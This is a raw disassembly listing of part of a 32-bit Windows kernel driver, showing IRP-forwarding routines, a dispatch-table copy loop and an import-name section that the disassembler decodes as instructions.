  40566f:	8d 54 24 4c          	lea    0x4c(%esp),%edx
  405673:	83 c4 0c             	add    $0xc,%esp
  405676:	8b c7                	mov    %edi,%eax
  405678:	2b d7                	sub    %edi,%edx
  40567a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  405680:	0f b7 08             	movzwl (%eax),%ecx
  405683:	66 89 0c 02          	mov    %cx,(%edx,%eax,1)
  405687:	83 c0 02             	add    $0x2,%eax
  40568a:	66 3b cb             	cmp    %bx,%cx
  40568d:	75 f1                	jne    0x405680
  40568f:	8d 7c 24 40          	lea    0x40(%esp),%edi
  405693:	83 c7 fe             	add    $0xfffffffe,%edi
  405696:	66 8b 47 02          	mov    0x2(%edi),%ax
  40569a:	83 c7 02             	add    $0x2,%edi
  40569d:	66 3b c3             	cmp    %bx,%ax
  4056a0:	75 f4                	jne    0x405696
  4056a2:	8b 15 04 62 40 00    	mov    0x406204,%edx
  4056a8:	89 17                	mov    %edx,(%edi)
  4056aa:	8b 46 0c             	mov    0xc(%esi),%eax
  4056ad:	d1 e8                	shr    $1,%eax
  4056af:	50                   	push   %eax
  4056b0:	8d 4e 10             	lea    0x10(%esi),%ecx
  4056b3:	51                   	push   %ecx
  4056b4:	8d 54 24 48          	lea    0x48(%esp),%edx
  4056b8:	52                   	push   %edx
  4056b9:	e8 a0 03 00 00       	call   0x405a5e
  4056be:	83 c4 0c             	add    $0xc,%esp
  4056c1:	8d 44 24 40          	lea    0x40(%esp),%eax
  4056c5:	50                   	push   %eax
  4056c6:	e8 35 fe ff ff       	call   0x405500
  4056cb:	53                   	push   %ebx
  4056cc:	56                   	push   %esi
  4056cd:	ff 15 28 61 40 00    	call   *0x406128
  4056d3:	4d                   	dec    %ebp
  4056d4:	83 fd ff             	cmp    $0xffffffff,%ebp
  4056d7:	0f 85 03 ff ff ff    	jne    0x4055e0
  4056dd:	8b 6c 24 1c          	mov    0x1c(%esp),%ebp
  4056e1:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  4056e5:	51                   	push   %ecx
  4056e6:	ff 15 08 61 40 00    	call   *0x406108
  4056ec:	8b f0                	mov    %eax,%esi
  4056ee:	3b f3                	cmp    %ebx,%esi
  4056f0:	7c 02                	jl     0x4056f4
  4056f2:	33 f6                	xor    %esi,%esi
  4056f4:	53                   	push   %ebx
  4056f5:	55                   	push   %ebp
  4056f6:	ff 15 28 61 40 00    	call   *0x406128
  4056fc:	8b 44 24 18          	mov    0x18(%esp),%eax
  405700:	3b c3                	cmp    %ebx,%eax
  405702:	74 07                	je     0x40570b
  405704:	50                   	push   %eax
  405705:	ff 15 14 60 40 00    	call   *0x406014
  40570b:	5f                   	pop    %edi
  40570c:	8b c6                	mov    %esi,%eax
  40570e:	5e                   	pop    %esi
  40570f:	5d                   	pop    %ebp
  405710:	5b                   	pop    %ebx
  405711:	81 c4 30 08 00 00    	add    $0x830,%esp
  405717:	c2 04 00             	ret    $0x4
  40571a:	cc                   	int3
  40571b:	cc                   	int3
  40571c:	cc                   	int3
  40571d:	cc                   	int3
  40571e:	cc                   	int3
  40571f:	cc                   	int3
  405720:	55                   	push   %ebp
  405721:	8b 6c 24 08          	mov    0x8(%esp),%ebp
  405725:	57                   	push   %edi
  405726:	8b f8                	mov    %eax,%edi
  405728:	85 ed                	test   %ebp,%ebp
  40572a:	74 6a                	je     0x405796
  40572c:	85 db                	test   %ebx,%ebx
  40572e:	74 5f                	je     0x40578f
  405730:	56                   	push   %esi
  405731:	ba fc ff ff ff       	mov    $0xfffffffc,%edx
  405736:	be 04 00 00 00       	mov    $0x4,%esi
  40573b:	2b d7                	sub    %edi,%edx
  40573d:	b9 3c 00 00 00       	mov    $0x3c,%ecx
  405742:	8d 47 3c             	lea    0x3c(%edi),%eax
  405745:	2b f7                	sub    %edi,%esi
  405747:	eb 07                	jmp    0x405750
  405749:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  405750:	8b 3d d8 9f 40 00    	mov    0x409fd8,%edi
  405756:	8b 7f 08             	mov    0x8(%edi),%edi
  405759:	03 fa                	add    %edx,%edi
  40575b:	8b 3c 07             	mov    (%edi,%eax,1),%edi
  40575e:	89 78 fc             	mov    %edi,-0x4(%eax)
  405761:	8b 3d d8 9f 40 00    	mov    0x409fd8,%edi
  405767:	8b 7f 08             	mov    0x8(%edi),%edi
  40576a:	8b 3c 39             	mov    (%ecx,%edi,1),%edi
  40576d:	89 38                	mov    %edi,(%eax)
  40576f:	8b 3d d8 9f 40 00    	mov    0x409fd8,%edi
  405775:	8b 7f 08             	mov    0x8(%edi),%edi
  405778:	03 fe                	add    %esi,%edi
  40577a:	8b 3c 07             	mov    (%edi,%eax,1),%edi
  40577d:	89 78 04             	mov    %edi,0x4(%eax)
  405780:	83 c1 0c             	add    $0xc,%ecx
  405783:	83 c0 0c             	add    $0xc,%eax
  405786:	81 f9 a8 00 00 00    	cmp    $0xa8,%ecx
  40578c:	7c c2                	jl     0x405750
  40578e:	5e                   	pop    %esi
  40578f:	55                   	push   %ebp
  405790:	ff 15 14 61 40 00    	call   *0x406114
  405796:	5f                   	pop    %edi
  405797:	5d                   	pop    %ebp
  405798:	85 db                	test   %ebx,%ebx
  40579a:	74 0a                	je     0x4057a6
  40579c:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  4057a0:	ff 25 c8 60 40 00    	jmp    *0x4060c8
  4057a6:	c2 04 00             	ret    $0x4
  4057a9:	cc                   	int3
  4057aa:	cc                   	int3
  4057ab:	cc                   	int3
  4057ac:	cc                   	int3
  4057ad:	cc                   	int3
  4057ae:	cc                   	int3
  4057af:	cc                   	int3
  4057b0:	83 ec 0c             	sub    $0xc,%esp
  4057b3:	53                   	push   %ebx
  4057b4:	55                   	push   %ebp
  4057b5:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  4057b9:	57                   	push   %edi
  4057ba:	8d 44 24 10          	lea    0x10(%esp),%eax
  4057be:	50                   	push   %eax
  4057bf:	8d 5c 24 20          	lea    0x20(%esp),%ebx
  4057c3:	8d 7c 24 18          	lea    0x18(%esp),%edi
  4057c7:	e8 a4 01 00 00       	call   0x405970
  4057cc:	85 c0                	test   %eax,%eax
  4057ce:	0f 8c 8c 00 00 00    	jl     0x405860
  4057d4:	83 7c 24 1c 06       	cmpl   $0x6,0x1c(%esp)
  4057d9:	73 07                	jae    0x4057e2
  4057db:	56                   	push   %esi
  4057dc:	ff 15 18 61 40 00    	call   *0x406118
  4057e2:	fe 46 23             	incb   0x23(%esi)
  4057e5:	83 46 60 24          	addl   $0x24,0x60(%esi)
  4057e9:	8b 1d d8 9f 40 00    	mov    0x409fd8,%ebx
  4057ef:	3b 2d cc 9f 40 00    	cmp    0x409fcc,%ebp
  4057f5:	74 2a                	je     0x405821
  4057f7:	8b 3d e0 9f 40 00    	mov    0x409fe0,%edi
  4057fd:	8b 0d dc 9f 40 00    	mov    0x409fdc,%ecx
  405803:	3b 2d d0 9f 40 00    	cmp    0x409fd0,%ebp
  405809:	75 04                	jne    0x40580f
  40580b:	8b c1                	mov    %ecx,%eax
  40580d:	eb 0e                	jmp    0x40581d
  40580f:	33 c0                	xor    %eax,%eax
  405811:	3b 2d d4 9f 40 00    	cmp    0x409fd4,%ebp
  405817:	0f 95 c0             	setne  %al
  40581a:	48                   	dec    %eax
  40581b:	23 c7                	and    %edi,%eax
  40581d:	3b c3                	cmp    %ebx,%eax
  40581f:	75 13                	jne    0x405834
  405821:	8b d6                	mov    %esi,%edx
  405823:	8b cb                	mov    %ebx,%ecx
  405825:	ff 15 90 60 40 00    	call   *0x406090
  40582b:	5f                   	pop    %edi
  40582c:	5d                   	pop    %ebp
  40582d:	5b                   	pop    %ebx
  40582e:	83 c4 0c             	add    $0xc,%esp
  405831:	c2 04 00             	ret    $0x4
  405834:	3b c1                	cmp    %ecx,%eax
  405836:	75 11                	jne    0x405849
  405838:	8b d6                	mov    %esi,%edx
  40583a:	ff 15 90 60 40 00    	call   *0x406090
  405840:	5f                   	pop    %edi
  405841:	5d                   	pop    %ebp
  405842:	5b                   	pop    %ebx
  405843:	83 c4 0c             	add    $0xc,%esp
  405846:	c2 04 00             	ret    $0x4
  405849:	3b c7                	cmp    %edi,%eax
  40584b:	75 13                	jne    0x405860
  40584d:	8b d6                	mov    %esi,%edx
  40584f:	8b cf                	mov    %edi,%ecx
  405851:	ff 15 90 60 40 00    	call   *0x406090
  405857:	5f                   	pop    %edi
  405858:	5d                   	pop    %ebp
  405859:	5b                   	pop    %ebx
  40585a:	83 c4 0c             	add    $0xc,%esp
  40585d:	c2 04 00             	ret    $0x4
  405860:	5f                   	pop    %edi
  405861:	5d                   	pop    %ebp
  405862:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
  405867:	5b                   	pop    %ebx
  405868:	83 c4 0c             	add    $0xc,%esp
  40586b:	c2 04 00             	ret    $0x4
  40586e:	cc                   	int3
  40586f:	cc                   	int3
  405870:	53                   	push   %ebx
  405871:	55                   	push   %ebp
  405872:	56                   	push   %esi
  405873:	8b f0                	mov    %eax,%esi
  405875:	8b 46 60             	mov    0x60(%esi),%eax
  405878:	80 38 16             	cmpb   $0x16,(%eax)
  40587b:	75 0a                	jne    0x405887
  40587d:	57                   	push   %edi
  40587e:	e8 2d ff ff ff       	call   0x4057b0
  405883:	5e                   	pop    %esi
  405884:	5d                   	pop    %ebp
  405885:	5b                   	pop    %ebx
  405886:	c3                   	ret
  405887:	ff 15 1c 61 40 00    	call   *0x40611c
  40588d:	8b 15 d8 9f 40 00    	mov    0x409fd8,%edx
  405893:	8b 2d e0 9f 40 00    	mov    0x409fe0,%ebp
  405899:	8b 1d dc 9f 40 00    	mov    0x409fdc,%ebx
  40589f:	3b 3d cc 9f 40 00    	cmp    0x409fcc,%edi
  4058a5:	75 04                	jne    0x4058ab
  4058a7:	8b ca                	mov    %edx,%ecx
  4058a9:	eb 16                	jmp    0x4058c1
  4058ab:	3b 3d d0 9f 40 00    	cmp    0x409fd0,%edi
  4058b1:	75 04                	jne    0x4058b7
  4058b3:	8b cb                	mov    %ebx,%ecx
  4058b5:	eb 0a                	jmp    0x4058c1
  4058b7:	3b 3d d4 9f 40 00    	cmp    0x409fd4,%edi
  4058bd:	75 06                	jne    0x4058c5
  4058bf:	8b cd                	mov    %ebp,%ecx
  4058c1:	85 c9                	test   %ecx,%ecx
  4058c3:	75 1a                	jne    0x4058df
  4058c5:	32 d2                	xor    %dl,%dl
  4058c7:	8b ce                	mov    %esi,%ecx
  4058c9:	c7 46 18 01 00 00 c0 	movl   $0xc0000001,0x18(%esi)
  4058d0:	ff 15 dc 60 40 00    	call   *0x4060dc
  4058d6:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
  4058db:	5e                   	pop    %esi
  4058dc:	5d                   	pop    %ebp
  4058dd:	5b                   	pop    %ebx
  4058de:	c3                   	ret
  4058df:	3b 05 00 70 40 00    	cmp    0x407000,%eax
  4058e5:	75 6b                	jne    0x405952
  4058e7:	3b ca                	cmp    %edx,%ecx
  4058e9:	75 21                	jne    0x40590c
  4058eb:	83 3d e4 9f 40 00 00 	cmpl   $0x0,0x409fe4
  4058f2:	74 18                	je     0x40590c
  4058f4:	fe 46 23             	incb   0x23(%esi)
  4058f7:	83 46 60 24          	addl   $0x24,0x60(%esi)
  4058fb:	8b 0d e4 9f 40 00    	mov    0x409fe4,%ecx
  405901:	8b d6                	mov    %esi,%edx
  405903:	5e                   	pop    %esi
  405904:	5d                   	pop    %ebp
  405905:	5b                   	pop    %ebx
  405906:	ff 25 90 60 40 00    	jmp    *0x406090
  40590c:	3b cb                	cmp    %ebx,%ecx
  40590e:	75 21                	jne    0x405931
  405910:	83 3d e8 9f 40 00 00 	cmpl   $0x0,0x409fe8
  405917:	74 18                	je     0x405931
  405919:	fe 46 23             	incb   0x23(%esi)
  40591c:	83 46 60 24          	addl   $0x24,0x60(%esi)
  405920:	8b 0d e8 9f 40 00    	mov    0x409fe8,%ecx
  405926:	8b d6                	mov    %esi,%edx
  405928:	5e                   	pop    %esi
  405929:	5d                   	pop    %ebp
  40592a:	5b                   	pop    %ebx
  40592b:	ff 25 90 60 40 00    	jmp    *0x406090
  405931:	3b cd                	cmp    %ebp,%ecx
  405933:	75 1d                	jne    0x405952
  405935:	a1 ec 9f 40 00       	mov    0x409fec,%eax
  40593a:	85 c0                	test   %eax,%eax
  40593c:	74 14                	je     0x405952
  40593e:	fe 46 23             	incb   0x23(%esi)
  405941:	83 46 60 24          	addl   $0x24,0x60(%esi)
  405945:	8b d6                	mov    %esi,%edx
  405947:	8b c8                	mov    %eax,%ecx
  405949:	5e                   	pop    %esi
  40594a:	5d                   	pop    %ebp
  40594b:	5b                   	pop    %ebx
  40594c:	ff 25 90 60 40 00    	jmp    *0x406090
  405952:	fe 46 23             	incb   0x23(%esi)
  405955:	83 46 60 24          	addl   $0x24,0x60(%esi)
  405959:	8b d6                	mov    %esi,%edx
  40595b:	5e                   	pop    %esi
  40595c:	5d                   	pop    %ebp
  40595d:	5b                   	pop    %ebx
  40595e:	ff 25 90 60 40 00    	jmp    *0x406090
  405964:	cc                   	int3
  405965:	cc                   	int3
  405966:	cc                   	int3
  405967:	cc                   	int3
  405968:	cc                   	int3
  405969:	cc                   	int3
  40596a:	cc                   	int3
  40596b:	cc                   	int3
  40596c:	cc                   	int3
  40596d:	cc                   	int3
  40596e:	cc                   	int3
  40596f:	cc                   	int3
  405970:	81 ec 28 01 00 00    	sub    $0x128,%esp
  405976:	55                   	push   %ebp
  405977:	8b ac 24 30 01 00 00 	mov    0x130(%esp),%ebp
  40597e:	56                   	push   %esi
  40597f:	33 c0                	xor    %eax,%eax
  405981:	68 18 01 00 00       	push   $0x118
  405986:	50                   	push   %eax
  405987:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  40598b:	51                   	push   %ecx
  40598c:	be 01 00 00 c0       	mov    $0xc0000001,%esi
  405991:	66 89 44 24 14       	mov    %ax,0x14(%esp)
  405996:	89 44 24 16          	mov    %eax,0x16(%esp)
  40599a:	66 89 44 24 1a       	mov    %ax,0x1a(%esp)
  40599f:	c7 44 24 1c 1c 01 00 	movl   $0x11c,0x1c(%esp)
  4059a6:	00 
  4059a7:	e8 d0 00 00 00       	call   0x405a7c
  4059ac:	83 c4 0c             	add    $0xc,%esp
  4059af:	68 b8 6a 40 00       	push   $0x406ab8
  4059b4:	8d 54 24 0c          	lea    0xc(%esp),%edx
  4059b8:	52                   	push   %edx
  4059b9:	ff 15 18 60 40 00    	call   *0x406018
  4059bf:	8d 44 24 08          	lea    0x8(%esp),%eax
  4059c3:	50                   	push   %eax
  4059c4:	ff 15 20 61 40 00    	call   *0x406120
  4059ca:	85 c0                	test   %eax,%eax
  4059cc:	74 35                	je     0x405a03
  4059ce:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  4059d2:	51                   	push   %ecx
  4059d3:	ff d0                	call   *%eax
  4059d5:	85 c0                	test   %eax,%eax
  4059d7:	7c 73                	jl     0x405a4c
  4059d9:	85 ff                	test   %edi,%edi
  4059db:	74 06                	je     0x4059e3
  4059dd:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  4059e1:	89 17                	mov    %edx,(%edi)
  4059e3:	85 db                	test   %ebx,%ebx
  4059e5:	74 06                	je     0x4059ed
  4059e7:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  4059eb:	89 0b                	mov    %ecx,(%ebx)
  4059ed:	85 ed                	test   %ebp,%ebp
  4059ef:	74 5b                	je     0x405a4c
  4059f1:	8b 54 24 18          	mov    0x18(%esp),%edx
  4059f5:	89 55 00             	mov    %edx,0x0(%ebp)
  4059f8:	5e                   	pop    %esi
  4059f9:	5d                   	pop    %ebp
  4059fa:	81 c4 28 01 00 00    	add    $0x128,%esp
  405a00:	c2 04 00             	ret    $0x4
  405a03:	6a 00                	push   $0x0
  405a05:	8d 44 24 20          	lea    0x20(%esp),%eax
  405a09:	50                   	push   %eax
  405a0a:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  405a0e:	51                   	push   %ecx
  405a0f:	8d 54 24 20          	lea    0x20(%esp),%edx
  405a13:	52                   	push   %edx
  405a14:	ff 15 24 61 40 00    	call   *0x406124
  405a1a:	84 c0                	test   %al,%al
  405a1c:	74 2c                	je     0x405a4a
  405a1e:	85 ff                	test   %edi,%edi
  405a20:	74 06                	je     0x405a28
  405a22:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  405a26:	89 07                	mov    %eax,(%edi)
  405a28:	85 db                	test   %ebx,%ebx
  405a2a:	74 06                	je     0x405a32
  405a2c:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  405a30:	89 0b                	mov    %ecx,(%ebx)
  405a32:	85 ed                	test   %ebp,%ebp
  405a34:	74 07                	je     0x405a3d
  405a36:	8b 54 24 18          	mov    0x18(%esp),%edx
  405a3a:	89 55 00             	mov    %edx,0x0(%ebp)
  405a3d:	33 c0                	xor    %eax,%eax
  405a3f:	5e                   	pop    %esi
  405a40:	5d                   	pop    %ebp
  405a41:	81 c4 28 01 00 00    	add    $0x128,%esp
  405a47:	c2 04 00             	ret    $0x4
  405a4a:	8b c6                	mov    %esi,%eax
  405a4c:	5e                   	pop    %esi
  405a4d:	5d                   	pop    %ebp
  405a4e:	81 c4 28 01 00 00    	add    $0x128,%esp
  405a54:	c2 04 00             	ret    $0x4
  405a57:	cc                   	int3
  405a58:	ff 25 10 60 40 00    	jmp    *0x406010
  405a5e:	ff 25 20 60 40 00    	jmp    *0x406020
  405a64:	ff 25 48 60 40 00    	jmp    *0x406048
  405a6a:	ff 25 88 60 40 00    	jmp    *0x406088
  405a70:	ff 25 8c 60 40 00    	jmp    *0x40608c
  405a76:	ff 25 b8 60 40 00    	jmp    *0x4060b8
  405a7c:	ff 25 2c 61 40 00    	jmp    *0x40612c
  405a82:	ff 25 30 61 40 00    	jmp    *0x406130
  405a88:	ff 25 34 61 40 00    	jmp    *0x406134
  405a8e:	ff 25 38 61 40 00    	jmp    *0x406138
  405a94:	ff 25 3c 61 40 00    	jmp    *0x40613c

Disassembly of section INIT:

0040a000 <INIT>:
  40a000:	44                   	inc    %esp
  40a001:	a0 00 00 00 00       	mov    0x0,%al
  40a006:	00 00                	add    %al,(%eax)
  40a008:	00 00                	add    %al,(%eax)
  40a00a:	00 00                	add    %al,(%eax)
  40a00c:	8e a7 00 00 08 60    	mov    0x60080000(%edi),%fs
  40a012:	00 00                	add    %al,(%eax)
  40a014:	3c a0                	cmp    $0xa0,%al
	...
  40a01e:	00 00                	add    %al,(%eax)
  40a020:	b0 a7                	mov    $0xa7,%al
  40a022:	00 00                	add    %al,(%eax)
  40a024:	00 60 00             	add    %ah,0x0(%eax)
	...
  40a03b:	00 9c a7 00 00 00 00 	add    %bl,0x0(%edi,%eiz,4)
  40a042:	00 00                	add    %al,(%eax)
  40a044:	ae                   	scas   %es:(%edi),%al
  40a045:	a1 00 00 c6 a1       	mov    0xa1c60000,%eax
  40a04a:	00 00                	add    %al,(%eax)
  40a04c:	e0 a1                	loopne 0x409fef
  40a04e:	00 00                	add    %al,(%eax)
  40a050:	ee                   	out    %al,(%dx)
  40a051:	a1 00 00 f8 a1       	mov    0xa1f80000,%eax
  40a056:	00 00                	add    %al,(%eax)
  40a058:	10 a2 00 00 2a a2    	adc    %ah,-0x5dd60000(%edx)
  40a05e:	00 00                	add    %al,(%eax)
  40a060:	34 a2                	xor    $0xa2,%al
  40a062:	00 00                	add    %al,(%eax)
  40a064:	4c                   	dec    %esp
  40a065:	a2 00 00 5c a2       	mov    %al,0xa25c0000
  40a06a:	00 00                	add    %al,(%eax)
  40a06c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a06d:	a2 00 00 86 a2       	mov    %al,0xa2860000
  40a072:	00 00                	add    %al,(%eax)
  40a074:	96                   	xchg   %eax,%esi
  40a075:	a2 00 00 a4 a2       	mov    %al,0xa2a40000
  40a07a:	00 00                	add    %al,(%eax)
  40a07c:	be a2 00 00 cc       	mov    $0xcc0000a2,%esi
  40a081:	a2 00 00 ec a2       	mov    %al,0xa2ec0000
  40a086:	00 00                	add    %al,(%eax)
  40a088:	f6 a2 00 00 16 a3    	mulb   -0x5cea0000(%edx)
  40a08e:	00 00                	add    %al,(%eax)
  40a090:	38 a3 00 00 58 a3    	cmp    %ah,-0x5ca80000(%ebx)
  40a096:	00 00                	add    %al,(%eax)
  40a098:	6c                   	insb   (%dx),%es:(%edi)
  40a099:	a3 00 00 80 a3       	mov    %eax,0xa3800000
  40a09e:	00 00                	add    %al,(%eax)
  40a0a0:	a0 a3 00 00 bc       	mov    0xbc0000a3,%al
  40a0a5:	a3 00 00 d4 a3       	mov    %eax,0xa3d40000
  40a0aa:	00 00                	add    %al,(%eax)
  40a0ac:	ea a3 00 00 06 a4 00 	ljmp   $0xa4,$0x60000a3
  40a0b3:	00 1e                	add    %bl,(%esi)
  40a0b5:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40a0b6:	00 00                	add    %al,(%eax)
  40a0b8:	36 a4                	movsb  %ss:(%esi),%es:(%edi)
  40a0ba:	00 00                	add    %al,(%eax)
  40a0bc:	4c                   	dec    %esp
  40a0bd:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40a0be:	00 00                	add    %al,(%eax)
  40a0c0:	60                   	pusha
  40a0c1:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40a0c2:	00 00                	add    %al,(%eax)
  40a0c4:	78 a4                	js     0x40a06a
  40a0c6:	00 00                	add    %al,(%eax)
  40a0c8:	92                   	xchg   %eax,%edx
  40a0c9:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40a0ca:	00 00                	add    %al,(%eax)
  40a0cc:	9e                   	sahf
  40a0cd:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40a0ce:	00 00                	add    %al,(%eax)
  40a0d0:	ae                   	scas   %es:(%edi),%al
  40a0d1:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40a0d2:	00 00                	add    %al,(%eax)
  40a0d4:	ca a4 00             	lret   $0xa4
  40a0d7:	00 e2                	add    %ah,%dl
  40a0d9:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40a0da:	00 00                	add    %al,(%eax)
  40a0dc:	94                   	xchg   %eax,%esp
  40a0dd:	a1 00 00 f8 a4       	mov    0xa4f80000,%eax
  40a0e2:	00 00                	add    %al,(%eax)
  40a0e4:	0a a5 00 00 20 a5    	or     -0x5ae00000(%ebp),%ah
  40a0ea:	00 00                	add    %al,(%eax)
  40a0ec:	2c a5                	sub    $0xa5,%al
  40a0ee:	00 00                	add    %al,(%eax)
  40a0f0:	46                   	inc    %esi
  40a0f1:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40a0f2:	00 00                	add    %al,(%eax)
  40a0f4:	5e                   	pop    %esi
  40a0f5:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40a0f6:	00 00                	add    %al,(%eax)
  40a0f8:	6a a5                	push   $0xffffffa5
  40a0fa:	00 00                	add    %al,(%eax)
  40a0fc:	86 a5 00 00 9e a5    	xchg   %ah,-0x5a620000(%ebp)
  40a102:	00 00                	add    %al,(%eax)
  40a104:	ba a5 00 00 cc       	mov    $0xcc0000a5,%edx
  40a109:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40a10a:	00 00                	add    %al,(%eax)
  40a10c:	da a5 00 00 ea a5    	fisubl -0x5a160000(%ebp)
  40a112:	00 00                	add    %al,(%eax)
  40a114:	fe                   	(bad)
  40a115:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40a116:	00 00                	add    %al,(%eax)
  40a118:	14 a6                	adc    $0xa6,%al
  40a11a:	00 00                	add    %al,(%eax)
  40a11c:	2a a6 00 00 46 a6    	sub    -0x59ba0000(%esi),%ah
  40a122:	00 00                	add    %al,(%eax)
  40a124:	52                   	push   %edx
  40a125:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40a126:	00 00                	add    %al,(%eax)
  40a128:	62 a6 00 00 7c a6    	bound  %esp,-0x59840000(%esi)
  40a12e:	00 00                	add    %al,(%eax)
  40a130:	94                   	xchg   %eax,%esp
  40a131:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40a132:	00 00                	add    %al,(%eax)
  40a134:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40a135:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40a136:	00 00                	add    %al,(%eax)
  40a138:	b8 a6 00 00 d0       	mov    $0xd00000a6,%eax
  40a13d:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40a13e:	00 00                	add    %al,(%eax)
  40a140:	e0 a6                	loopne 0x40a0e8
  40a142:	00 00                	add    %al,(%eax)
  40a144:	f4                   	hlt
  40a145:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40a146:	00 00                	add    %al,(%eax)
  40a148:	02 a7 00 00 14 a7    	add    -0x58ec0000(%edi),%ah
  40a14e:	00 00                	add    %al,(%eax)
  40a150:	22 a7 00 00 34 a7    	and    -0x58cc0000(%edi),%ah
  40a156:	00 00                	add    %al,(%eax)
  40a158:	4a                   	dec    %edx
  40a159:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40a15a:	00 00                	add    %al,(%eax)
  40a15c:	62 a7 00 00 7e a7    	bound  %esp,-0x58820000(%edi)
  40a162:	00 00                	add    %al,(%eax)
  40a164:	80 a1 00 00 b8 a7 00 	andb   $0x0,-0x58480000(%ecx)
  40a16b:	00 c2                	add    %al,%dl
  40a16d:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40a16e:	00 00                	add    %al,(%eax)
  40a170:	d6                   	salc
  40a171:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40a172:	00 00                	add    %al,(%eax)
  40a174:	e0 a7                	loopne 0x40a11d
  40a176:	00 00                	add    %al,(%eax)
  40a178:	ea a7 00 00 00 00 00 	ljmp   $0x0,$0xa7
  40a17f:	00 4e 00             	add    %cl,0x0(%esi)
  40a182:	45                   	inc    %ebp
  40a183:	78 46                	js     0x40a1cb
  40a185:	72 65                	jb     0x40a1ec
  40a187:	65 50                	gs push %eax
  40a189:	6f                   	outsl  %ds:(%esi),(%dx)
  40a18a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a18b:	6c                   	insb   (%dx),%es:(%edi)
  40a18c:	57                   	push   %edi
  40a18d:	69 74 68 54 61 67 00 	imul   $0xfc006761,0x54(%eax,%ebp,2),%esi
  40a194:	fc 
  40a195:	01 4b 65             	add    %ecx,0x65(%ebx)
  40a198:	44                   	inc    %esp
  40a199:	65 6c                	gs insb (%dx),%es:(%edi)
  40a19b:	61                   	popa
  40a19c:	79 45                	jns    0x40a1e3
  40a19e:	78 65                	js     0x40a205
  40a1a0:	63 75 74             	arpl   %esi,0x74(%ebp)
  40a1a3:	69 6f 6e 54 68 72 65 	imul   $0x65726854,0x6e(%edi),%ebp
  40a1aa:	61                   	popa
  40a1ab:	64 00 00             	add    %al,%fs:(%eax)
  40a1ae:	4c                   	dec    %esp
  40a1af:	03 50 73             	add    0x73(%eax),%edx
  40a1b2:	43                   	inc    %ebx
  40a1b3:	72 65                	jb     0x40a21a
  40a1b5:	61                   	popa
  40a1b6:	74 65                	je     0x40a21d
  40a1b8:	53                   	push   %ebx
  40a1b9:	79 73                	jns    0x40a22e
  40a1bb:	74 65                	je     0x40a222
  40a1bd:	6d                   	insl   (%dx),%es:(%edi)
  40a1be:	54                   	push   %esp
  40a1bf:	68 72 65 61 64       	push   $0x64616572
  40a1c4:	00 00                	add    %al,(%eax)
  40a1c6:	98                   	cwtl
  40a1c7:	03 50 73             	add    0x73(%eax),%edx
  40a1ca:	54                   	push   %esp
  40a1cb:	65 72 6d             	gs jb  0x40a23b
  40a1ce:	69 6e 61 74 65 53 79 	imul   $0x79536574,0x61(%esi),%ebp
  40a1d5:	73 74                	jae    0x40a24b
  40a1d7:	65 6d                	gs insl (%dx),%es:(%edi)
  40a1d9:	54                   	push   %esp
  40a1da:	68 72 65 61 64       	push   $0x64616572
  40a1df:	00 95 05 5f 76 73    	add    %dl,0x73765f05(%ebp)
  40a1e5:	6e                   	outsb  %ds:(%esi),(%dx)
  40a1e6:	77 70                	ja     0x40a258
  40a1e8:	72 69                	jb     0x40a253
  40a1ea:	6e                   	outsb  %ds:(%esi),(%dx)
  40a1eb:	74 66                	je     0x40a253
  40a1ed:	00 0b                	add    %cl,(%ebx)
  40a1ef:	05 5a 77 43 6c       	add    $0x6c43775a,%eax
  40a1f4:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1f5:	73 65                	jae    0x40a25c
  40a1f7:	00 1d 04 52 74 6c    	add    %bl,0x6c745204
  40a1fd:	49                   	dec    %ecx
  40a1fe:	6e                   	outsb  %ds:(%esi),(%dx)
  40a1ff:	69 74 55 6e 69 63 6f 	imul   $0x646f6369,0x6e(%ebp,%edx,2),%esi
  40a206:	64 
  40a207:	65 53                	gs push %ebx
  40a209:	74 72                	je     0x40a27d
  40a20b:	69 6e 67 00 00 bd 03 	imul   $0x3bd0000,0x67(%esi),%ebp
  40a212:	52                   	push   %edx
  40a213:	74 6c                	je     0x40a281
  40a215:	43                   	inc    %ebx
  40a216:	6f                   	outsl  %ds:(%esi),(%dx)
  40a217:	6d                   	insl   (%dx),%es:(%edi)
  40a218:	70 61                	jo     0x40a27b
  40a21a:	72 65                	jb     0x40a281
  40a21c:	55                   	push   %ebp
  40a21d:	6e                   	outsb  %ds:(%esi),(%dx)
  40a21e:	69 63 6f 64 65 53 74 	imul   $0x74536564,0x6f(%ebx),%esp
  40a225:	72 69                	jb     0x40a290
  40a227:	6e                   	outsb  %ds:(%esi),(%dx)
